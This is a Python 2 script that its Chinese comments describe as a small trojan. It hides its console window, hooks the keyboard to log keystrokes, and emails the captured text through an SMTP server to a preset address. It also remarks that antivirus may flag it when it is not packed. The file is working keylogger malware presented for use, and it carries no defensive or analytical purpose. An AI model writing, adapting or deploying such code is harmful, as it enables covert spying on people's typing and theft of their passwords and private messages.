#小型木马，监听键盘（运行时隐藏窗体），自动发邮件，未加壳发邮件时有一定几率被警报
import ctypes
import pythoncom 
import pyHook
import os
#smtp发邮件
import sys
import re
import urllib
import smtplib
import random
from email.mime.text import MIMEText 
#此处信息可以根据协议自行更改 
to=['****@163.com']
host="smtp.163.com"  #smtp服务器
user="********"    #用户名,进行自行更改
password="*****"   #密码
postfix="163.com"  #后缀

a=[]
#利用win32 api隐藏console窗体
def hiding():
   whnd = ctypes.windll.kernel32.GetConsoleWindow()
   if whnd != 0:
      ctypes.windll.user32.ShowWindow(whnd, 0)
      ctypes.windll.kernel32.CloseHandle(whnd)

#放置键盘监听钩子
def seeing():
    
      PH=pyHook.HookManager()
      PH.KeyDown=onKeyboardEvent
      
      PH.HookKeyboard()
      pythoncom.PumpMessages() 

#键盘事件
def onKeyboardEvent(event):
   
    #print event.Key,
    if len(a)<=20:#此处用于测试可自行升高
       
       a.append(event.Key)
    else:
       text=''.join(a)
       if send_mail(to,"键盘记录test1",text): 
          print "Suceed!" 
       else: 
          print "Failed!"
       sys.exit(0)
       
    return True

#smtp发信
def send_mail(to_list,sub,content): 
    me="键盘记录"+"<"+user+"@"+postfix+">" 
    msg = MIMEText(content,_subtype='plain',_charset='gb2312') 
    msg['Subject'] = sub 
    msg['From'] = me 
    msg['To'] = ";".join(to_list) 
    try: 
        server = smtplib.SMTP() 
        server.connect(host) 
        server.login(user,password) 
        server.sendmail(me, to_list, msg.as_string()) 
        server.close() 
        return True 
    except Exception, e: 
        print str(e) 
        return False 
if __name__=="__main__":
    
    hiding()
    seeing()
    
    
